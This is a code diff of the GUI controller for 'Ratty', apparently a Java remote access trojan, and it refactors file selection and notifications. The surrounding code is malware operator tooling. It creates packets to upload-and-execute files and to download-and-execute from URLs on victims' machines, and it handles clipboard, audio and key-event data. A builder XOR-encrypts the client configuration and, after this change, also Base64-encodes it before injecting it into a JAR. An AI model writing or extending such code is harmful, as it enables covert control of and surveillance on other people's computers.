@@ -19,10 +19,11 @@ package de.sogomn.rat.gui;
 import static de.sogomn.rat.util.Constants.LANGUAGE;
 
 import java.awt.image.BufferedImage;
+import java.io.File;
 import java.net.URL;
 import java.nio.file.Path;
-import java.nio.file.Paths;
 import java.text.SimpleDateFormat;
+import java.util.Base64;
 import java.util.Collection;
 import java.util.HashMap;
 import java.util.Set;
@@ -31,17 +32,13 @@ import java.util.stream.Stream;
 
 import javax.imageio.ImageIO;
 import javax.swing.ImageIcon;
-import javax.swing.JFileChooser;
 import javax.swing.JOptionPane;
-import javax.swing.filechooser.FileFilter;
-import javax.swing.filechooser.FileNameExtensionFilter;
 
 import org.jnativehook.keyboard.NativeKeyEvent;
 
 import de.sogomn.engine.fx.Sound;
 import de.sogomn.engine.util.FileUtils;
 import de.sogomn.rat.ActiveConnection;
-import de.sogomn.rat.gui.swing.Notification;
 import de.sogomn.rat.packet.AudioPacket;
 import de.sogomn.rat.packet.ChatPacket;
 import de.sogomn.rat.packet.ClipboardPacket;
@@ -90,8 +87,7 @@ public final class RattyGuiController extends AbstractRattyController implements
 	private IBuilderGui builder;
 	private IServerListGui serverList;
 	
-	private JFileChooser fileChooser;
-	private Path selectedBuilderFile;
+	private File selectedBuilderFile;
 	
 	private HashMap<ActiveConnection, ServerClient> clients;
 	private long lastServerStart;
@@ -105,7 +101,6 @@ public final class RattyGuiController extends AbstractRattyController implements
 		"lato.ttf",
 		"icons.png",
 		
-		"language/lang_bsq.properties",
 		"language/lang_de.properties",
 		"language/lang_en.properties",
 		"language/lang_es.properties",
@@ -133,6 +128,7 @@ public final class RattyGuiController extends AbstractRattyController implements
 		"de/sogomn/rat/gui/IRattyGui.class",
 		"de/sogomn/rat/gui/IFileBrowserGui.class",
 		"de/sogomn/rat/gui/IBuilderGui.class",
+		"de/sogomn/rat/gui/INotificationGui.class",
 		"de/sogomn/rat/gui/ServerClient.class",
 		"de/sogomn/rat/gui/RattyGuiController.class",
 		
@@ -140,7 +136,7 @@ public final class RattyGuiController extends AbstractRattyController implements
 		"de/sogomn/rat/gui/swing/DisplaySwingGui.class",
 		"de/sogomn/rat/gui/swing/FileBrowserSwingGui.class",
 		"de/sogomn/rat/gui/swing/LoggingSwingGui.class",
-		"de/sogomn/rat/gui/swing/Notification.class",
+		"de/sogomn/rat/gui/swing/NotificationSwingGui.class",
 		"de/sogomn/rat/gui/swing/RattySwingGui.class",
 		"de/sogomn/rat/gui/swing/RattySwingGuiFactory.class",
 		"de/sogomn/rat/gui/swing/ServerClientTableModel.class",
@@ -201,7 +197,6 @@ public final class RattyGuiController extends AbstractRattyController implements
 		gui = guiFactory.createRattyGui();
 		builder = guiFactory.createBuilderGui();
 		serverList = guiFactory.createServerListGui();
-		fileChooser = new JFileChooser(".");
 		clients = new HashMap<ActiveConnection, ServerClient>();
 		
 		serverList.addListener(this);
@@ -214,61 +209,6 @@ public final class RattyGuiController extends AbstractRattyController implements
 		pingThread.setPriority(Thread.MIN_PRIORITY);
 		pingThread.setDaemon(true);
 		pingThread.start();
-	}
-	
-	public Path getFile(final String type) {
-		final FileFilter filter;
-		
-		if (type != null) {
-			filter = new FileNameExtensionFilter("*." + type, type);
-		} else {
-			filter = null;
-		}
-		
-		fileChooser.setFileFilter(filter);
-		
-		final int input = fileChooser.showOpenDialog(null);
-		
-		if (input == JFileChooser.APPROVE_OPTION) {
-			final Path file = fileChooser.getSelectedFile().toPath();
-			
-			return file;
-		}
-		
-		return null;
-	}
-	
-	public Path getFile() {
-		return getFile(null);
-	}
-	
-	public Path getSaveFile() {
-		final int input = fileChooser.showSaveDialog(null);
-		
-		if (input == JFileChooser.APPROVE_OPTION) {
-			final Path file = fileChooser.getSelectedFile().toPath();
-			
-			return file;
-		}
-		
-		return null;
-	}
-	
-	public Path getSaveFile(final String type) {
-		Path file = getSaveFile();
-		
-		if (file == null) {
-			return null;
-		}
-		
-		final String path = file.toString().toLowerCase();
-		final String suffix = "." + type.toLowerCase();
-		
-		if (!path.endsWith(suffix)) {
-			file = Paths.get(path + suffix);
-		}
-		
-		return file;
 	}
 	
 	/*
@@ -323,10 +263,17 @@ public final class RattyGuiController extends AbstractRattyController implements
 	}
 	
 	private AudioPacket createAudioPacket() {
-		final Path file = getFile("WAV");
-		final AudioPacket packet = new AudioPacket(file);
+		final File file = gui.getOpenFile("WAV");
 		
-		return packet;
+		if (file != null) {
+			final String path = file.getAbsolutePath();
+			final byte[] data = FileUtils.readExternalData(path);
+			final AudioPacket packet = new AudioPacket(data);
+			
+			return packet;
+		}
+		
+		return null;
 	}
 	
 	private DownloadFilePacket createDownloadPacket(final ServerClient client) {
@@ -337,11 +284,12 @@ public final class RattyGuiController extends AbstractRattyController implements
 	}
 	
 	private UploadFilePacket createUploadPacket(final ServerClient client) {
-		final Path file = getFile();
+		final File file = client.fileBrowser.getOpenFile();
 		
 		if (file != null) {
-			final String fileName = file.getFileName().toString();
-			final byte[] data = FileUtils.readExternalData(file.toString());
+			final String fileName = file.getName();
+			final String filePath = file.getAbsolutePath();
+			final byte[] data = FileUtils.readExternalData(filePath);
 			final String path = client.fileBrowser.getCurrentDirectoryPath() + SEPARATOR + fileName;
 			final UploadFilePacket packet = new UploadFilePacket(path, data);
 			
@@ -391,10 +339,10 @@ public final class RattyGuiController extends AbstractRattyController implements
 	}
 	
 	private DownloadUrlPacket createDownloadUrlPacket(final ServerClient client) {
-		final String address = gui.getInput(URL_MESSAGE);
+		final String address = client.fileBrowser.getInput(URL_MESSAGE);
 		
 		if (address != null) {
-			final String path = client.fileBrowser.getCurrentDirectoryPath().toString();
+			final String path = client.fileBrowser.getCurrentDirectoryPath();
 			final DownloadUrlPacket packet = new DownloadUrlPacket(address, path);
 			
 			return packet;
@@ -411,12 +359,13 @@ public final class RattyGuiController extends AbstractRattyController implements
 	}
 	
 	private UploadFilePacket createUploadExecutePacket(final ServerClient client) {
-		final Path file = getFile();
+		final File file = gui.getOpenFile();
 		
 		if (file != null) {
-			final String path = client.fileBrowser.getCurrentDirectoryPath() + "/" + file.getFileName();
-			final byte[] data = FileUtils.readExternalData(file.toString());
-			final UploadFilePacket packet = new UploadFilePacket(path, data, true);
+			final String fileName = file.getName();
+			final String filePath = file.getAbsolutePath();
+			final byte[] data = FileUtils.readExternalData(filePath);
+			final UploadFilePacket packet = new UploadFilePacket(fileName, data, true);
 			
 			return packet;
 		}
@@ -425,7 +374,7 @@ public final class RattyGuiController extends AbstractRattyController implements
 	}
 	
 	private DownloadUrlPacket createDropExecutePacket(final ServerClient client) {
-		final String address = client.fileBrowser.getInput(URL_MESSAGE);
+		final String address = gui.getInput(URL_MESSAGE);
 		
 		if (address != null) {
 			final DownloadUrlPacket packet = new DownloadUrlPacket(address, "", true);
@@ -517,11 +466,14 @@ public final class RattyGuiController extends AbstractRattyController implements
 		}
 		
 		final String dataReplacementString = Stream.of(entries).collect(Collectors.joining("\r\n"));
-		final byte[] dataReplacement = dataReplacementString.getBytes();
 		
-		XorCipher.crypt(dataReplacement);
+		byte[] dataReplacement = dataReplacementString.getBytes();
+		dataReplacement = XorCipher.crypt(dataReplacement);
+		dataReplacement = Base64.getEncoder().encode(dataReplacement);
 		
-		final JarBuilder jarBuilder = new JarBuilder(selectedBuilderFile);
+		
+		final Path path = selectedBuilderFile.toPath();
+		final JarBuilder jarBuilder = new JarBuilder(path);
 		
 		jarBuilder.replaceFile(BUILDER_DATA_REPLACEMENT, dataReplacement);
 		jarBuilder.replaceFile(BUILDER_MANIFEST_REPLACEMENT, BUILDER_MANIFEST_REPLACEMENT_DATA);
@@ -538,10 +490,10 @@ public final class RattyGuiController extends AbstractRattyController implements
 	}
 	
 	private void selectBuilderFile() {
-		selectedBuilderFile = getSaveFile("JAR");
+		selectedBuilderFile = builder.getSaveFile("JAR");
 		
 		if (selectedBuilderFile != null) {
-			final String name = selectedBuilderFile.getFileName().toString();
+			final String name = selectedBuilderFile.getName();
 			
 			builder.setFileName(name);
 		} else {
@@ -1064,7 +1016,7 @@ public final class RattyGuiController extends AbstractRattyController implements
 		gui.update();
 		
 		if (shouldNotify) {
-			final Notification notification = new Notification(name + " " + address, icon);
+			final INotificationGui notification = guiFactory.createNotificationGui(name + " " + address, icon);
 			
 			notification.trigger();
 			PING.play();
